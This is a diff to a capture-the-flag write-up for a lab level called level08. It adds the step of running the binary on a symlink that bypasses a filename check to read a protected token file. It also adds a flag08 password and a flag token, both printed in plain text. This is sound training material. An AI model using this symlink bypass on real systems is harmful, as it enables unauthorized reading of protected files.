@@ -61,6 +61,7 @@ Bypass the filename check in the `level08` executable to gain access to the `tok
 - To exploit this:
 	```bash
     ln -s /home/user/level08/token /tmp/test
+    ./level08 /tmp/test
     ```
 	Ouput:
     ```bash
@@ -68,3 +69,20 @@ Bypass the filename check in the `level08` executable to gain access to the `tok
     ```
 	This command creates a symlink `/tmp/test` pointing to `/home/user/level08/token`.  
 	Since the symlink doesn't contain the word token, it avoids the `strstr` check, allowing indirect access to the `token` file.
+
+4. **Retrieve the flag**  
+    To retrieve the flag, the session has to switch to user `flag08`:  
+    
+    ```bash 
+    su flag08
+    ```
+    Output:
+    ```bash
+    Password: 
+    ```
+    The password  `quif5eloekouj29ke0vouxean` is entered and the session switches to flag08.  
+    To retrieve the flag the command `getflag` is used:   
+    Output:
+    ```bash
+    Check flag.Here is your token : 25749xKZ8L7DkSCwJkT9dyv6f
+    ```
